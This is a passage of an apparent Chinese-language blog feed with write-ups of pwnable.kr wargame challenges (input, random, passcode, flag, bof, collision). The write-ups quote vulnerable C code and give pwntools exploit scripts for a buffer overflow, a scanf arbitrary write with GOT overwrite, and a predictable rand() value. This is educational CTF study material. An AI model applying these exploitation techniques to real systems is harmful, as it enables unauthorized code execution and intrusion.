class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># argv</span></span><br><span class="line">args = [<span class="string">&#x27;A&#x27;</span>] * <span class="number">100</span></span><br><span class="line">args[<span class="number">65</span>] = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">args[<span class="number">66</span>] = <span class="string">&#x27;\x20\x0a\x0d&#x27;</span></span><br><span class="line">args[<span class="number">67</span>] = <span class="string">&#x27;6666&#x27;</span>  <span class="comment"># network</span></span><br><span class="line"><span class="comment"># stdio</span></span><br><span class="line">r1, w1 = os.pipe()</span><br><span class="line">r2, w2 = os.pipe()</span><br><span class="line">os.write(w1, <span class="string">b&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">os.write(w2, <span class="string">b&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br><span class="line"><span class="comment"># env</span></span><br><span class="line">l_env = &#123;<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>: <span class="string">&#x27;\xca\xfe\xba\xbe&#x27;</span>&#125;</span><br><span class="line"><span class="comment"># file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;\x0a&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">p = process(executable=<span class="string">&#x27;./input&#x27;</span>,</span><br><span class="line">            argv=args,</span><br><span class="line">            stdin=r1, stderr=r2,</span><br><span class="line">            env=l_env)</span><br><span class="line"><span class="comment"># network</span></span><br><span class="line">conn = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">6666</span>)</span><br><span class="line">conn.sendline(<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本来是想远程上传文件的，但是没想到没有上传文件的权限。(焯，没想到是只有tmp有权限似乎，呜呜)</p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%83%E3%80%81input//image-20220517170055159.png" alt="image-20220517170055159"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">mkdir poem</span><br><span class="line">cd poem</span><br><span class="line">nano solve.py</span><br><span class="line">ln -s /home/input2/flag flag</span><br><span class="line">python solve.py</span><br></pre></td></tr></table></figure><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%83%E3%80%81input//image-20220517195232256.png" alt="image-20220517195232256"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mommy! I learned how to pass various input in Linux :)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwnable.kr </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable刷题 </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable题解、六、random</title>
      <link href="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E5%85%AD%E3%80%81random/"/>
      <url>/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E5%85%AD%E3%80%81random/</url>
      
        <content type="html"><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Daddy, teach me how to use random value in programming!</span><br><span class="line"></span><br><span class="line">ssh random@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> random;</span><br><span class="line">random = rand();<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题没什么难的，只要知道默认的rand就行了，因为没有初始化一个随机数种子，所以每次运行的时候的随机数都会是一个固定的值，这里我直接在ubuntu里面调试获得了默认的random的数值为<code>0x6b8b4567</code></p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E5%85%AD%E3%80%81random//image-20220516184527034.png" alt="image-20220516184527034"></p><p>那我们的payload很容易就能得出来了</p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E5%85%AD%E3%80%81random//image-20220516184602061.png" alt="image-20220516184602061"></p><p>故payload为:<code>3039230856</code></p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E5%85%AD%E3%80%81random//image-20220516184634734.png" alt="image-20220516184634734"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mommy, I thought libc random is unpredictable...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwnable.kr </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable刷题 </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable题解、五、passcode</title>
      <link href="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%BA%94%E3%80%81passcode/"/>
      <url>/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%BA%94%E3%80%81passcode/</url>
      
        <content type="html"><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mommy told me to make a passcode based login system.</span><br><span class="line">My initial C code was compiled without any error!</span><br><span class="line">Well, there was some compiler warning, but who cares about that?</span><br><span class="line"></span><br><span class="line">ssh passcode@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>下载源码和二进制文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">login</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> passcode1;</span><br><span class="line"><span class="type">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先welcome函数没什么大的问题，login函数的passcode1他的原意可能是取地址赋值，但是忘记加<code>&amp;</code>从而出现了问题，</p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%BA%94%E3%80%81passcode//image-20220516162411180.png" alt="image-20220516162411180"></p><p>根据上图，name的地址应为<code>ebp-0x70</code>(函数调用先传参数再call函数)。</p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%BA%94%E3%80%81passcode//image-20220516162607207.png" alt="image-20220516162607207"></p><p>然后我们分别在name、passcode1处加上断点，并执行过去。</p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%BA%94%E3%80%81passcode//image-20220516162825354.png" alt="image-20220516162825354"></p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%BA%94%E3%80%81passcode//image-20220516162847348.png" alt="image-20220516162847348"></p><p>据此，两段函数使用同一段ebp。然后<code>0x70-0x10 = 0x60 = 96</code>，name的长度为100，name起始处与passcode1在内存中的地址相差为96byte，那就可以让name的最后四个字节，覆盖到passcode1处。</p><p>而当程序执行到下面的这句代码的时候。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanf(&quot;%d&quot;, passcode1)</span><br></pre></td></tr></table></figure><p>会直接把stdin的值，也就是我们输入的值，赋值到passcode1未初始化时的地址。那么现在脉络就清晰了，我们可以控制任意地址的值，我们把这种情况叫做<strong>任意地址写</strong></p><p>然后就来到了这道题目的关键了：<strong>GOT表覆写技术</strong></p><h4 id="got表覆写"><a href="#got表覆写" class="headerlink" title="got表覆写"></a>got表覆写</h4><p>got表用来存储外部函数引用的地址，这里可以使用<code>objdump -R passcode</code>来查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">❯ objdump -R passcode                                                                                       </span><br><span class="line"></span><br><span class="line">passcode:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line">08049ff0 R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">0804a02c R_386_COPY        stdin@@GLIBC_2.0</span><br><span class="line">0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0</span><br><span class="line">0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0</span><br><span class="line">0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4</span><br><span class="line">0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0</span><br><span class="line">0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0</span><br><span class="line">0804a014 R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0</span><br><span class="line">0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure><p>程序执行到下一步，也就是fflush的时候会查找这个表，然后找到<code>0804a004</code>这个地址，然后程序跳转到这个地址对应的value：<code>fflush@GLIBC_2.0</code>继续执行，我们需要覆盖这个value的值为下面的system函数的地址。</p><h4 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h4><p>在要输入name的时候，我们首先需要构造96byte的垃圾数据，后面四个字节填充<code>0804a004</code>，然后在之后需要输入passcode1的时候输入system函数的所在地址即可。</p><p>system函数的地址：<code>0x080485e3</code></p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%BA%94%E3%80%81passcode//image-20220516165101534.png" alt="image-20220516165101534"></p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;A&#x27;</span> * <span class="number">96</span> + p32(<span class="number">0x0804a004</span>)</span><br><span class="line"></span><br><span class="line">passcode = <span class="string">b&#x27;134514147&#x27;</span></span><br><span class="line"></span><br><span class="line">client = ssh(user=<span class="string">&quot;passcode&quot;</span>, host=<span class="string">&quot;pwnable.kr&quot;</span>, port=<span class="number">2222</span>, password=<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">p = client.process(executable=<span class="string">&#x27;./passcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖地址</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(name)</span><br><span class="line"><span class="comment"># 覆盖地址值</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(passcode)</span><br><span class="line"><span class="comment"># 获得flag</span></span><br><span class="line">data = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.close()</span><br><span class="line">client.close()</span><br></pre></td></tr></table></figure><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%BA%94%E3%80%81passcode//image-20220516170256341.png" alt="image-20220516170256341"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry mom.. I got confused about scanf usage :(</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwnable.kr </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable刷题 </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable题解、四、flag</title>
      <link href="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E5%9B%9B%E3%80%81flag/"/>
      <url>/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E5%9B%9B%E3%80%81flag/</url>
      
        <content type="html"><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Papa brought me a packed present! let&#x27;s open it.</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/flag</span><br><span class="line"></span><br><span class="line">This is reversing task. all you need is binary</span><br></pre></td></tr></table></figure><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E5%9B%9B%E3%80%81flag//image-20220516124651366.png" alt="image-20220516124651366"></p><p>upx壳，要先脱壳。使用官方的脱壳工具，<code>upx -d</code>即可成功脱壳。</p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E5%9B%9B%E3%80%81flag//image-20220516125457082.png" alt="image-20220516125457082"></p><p>脱壳之后直接扔ida，<code>shift + f12</code>查找字符串，就能看到答案了，也就是flag的值，如下</p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E5%9B%9B%E3%80%81flag//image-20220516125912630.png" alt="image-20220516125912630"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPX...? sounds like a delivery service :)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwnable.kr </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable刷题 </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable题解、三、bof</title>
      <link href="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%89%E3%80%81bof/"/>
      <url>/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%89%E3%80%81bof/</url>
      
        <content type="html"><![CDATA[<h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability. </span><br><span class="line">Is that true?</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/bof</span><br><span class="line">Download : http://pwnable.kr/bin/bof.c</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure><p>这题的靶机没给哈，但是把漏洞文件给出来了还是，直接下载。</p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%89%E3%80%81bof//image-20220516103623592.png" alt="image-20220516103623592"></p><p>看着代码的内容非常熟悉😄，把二进制文件拖进ubuntu调试一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">break main</span><br><span class="line">disas func</span><br></pre></td></tr></table></figure><p>首先看func函数附近的汇编代码，在下面这句汇编处再添加一个断点，之后c。</p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%89%E3%80%81bof//image-20220516103907114.png" alt="image-20220516103907114"></p><p>这里会跳出来一个<code>overflow me:</code>，直接再输入20个A看看。</p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%89%E3%80%81bof//image-20220516104137853.png" alt="image-20220516104137853"></p><h4 id="gets栈溢出"><a href="#gets栈溢出" class="headerlink" title="gets栈溢出"></a>gets栈溢出</h4><p>回车，<code>x/50wx $esp</code>查看栈中的数据</p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%89%E3%80%81bof//image-20220516104325548.png" alt="image-20220516104325548"></p><p>找到了入栈的参数值，还有gets获得的值，<code>gets函数栈溢出</code>之后会覆盖掉传进去的参数的值，而我们要计算的是，需要传进去的垃圾数据的位数，<code>4 + 4x4x3 = 52</code>，我们需要传进去52byte的垃圾数据，然后使用<code>0xcafebabe</code>覆盖掉参数。</p><p>使用python的pwntools直接解题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">52</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">p = remote(<span class="string">&quot;pwnable.kr&quot;</span>, <span class="number">9000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%B8%89%E3%80%81bof//image-20220516105326213.png" alt="image-20220516105326213"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwnable.kr </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable刷题 </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable题解、二、collision</title>
      <link href="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%BA%8C%E3%80%81collision/"/>
      <url>/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%BA%8C%E3%80%81collision/</url>
      
        <content type="html"><![CDATA[<h3 id="二、collision"><a href="#二、collision" class="headerlink" title="二、collision"></a>二、collision</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Daddy told me about cool MD5 hash collision today.</span><br><span class="line">I wanna do something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p 2222 (pw:guest)</span><br></pre></td></tr></table></figure><p>题目的代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line"><span class="type">int</span>* ip = (<span class="type">int</span>*)p;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">res += ip[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题目，需要让hashcode这个全局变量的值等于<code>check_password()</code>函数返回的值，那我们再去看看这个函数。我觉得这个题目最难理解的点就是下面这句代码<code>int* ip = (int*)p;</code>，我们分析一下这个人难点。</p><h4 id="1、难点分析"><a href="#1、难点分析" class="headerlink" title="1、难点分析"></a>1、难点分析</h4><p>这个p的数据类型是<code>char*</code>，也就是一个指针，指向的是一个字符数组这个样子。然后<code>(int*)p</code>就对p的值进行了一个强制类型转换，根据我的玄学看法，这个语句的大概意思就是：</p><p><strong>把指针指向的char类型的数据强制转换成了int类型。譬如：若p[0]为A，那ip[0]就为0x41</strong></p><p>p指向的数据正是passcode的值，也就是我们运行软件的时候输入的参数的值。p的位数为20位，5个ip的值相加为res的最终值。每个ip的最后的值为四个char的值排在一起的值。</p><p><img src="/2022/05/16/pwnable%E9%A2%98%E8%A7%A3%E3%80%81%E4%BA%8C%E3%80%81collision//image-20220515223752904.png" alt="image-20220515223752904"></p><p>也就是说当我们输入20个A的时候，每个ip的值都为<code>0x41414141</code>，验证一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 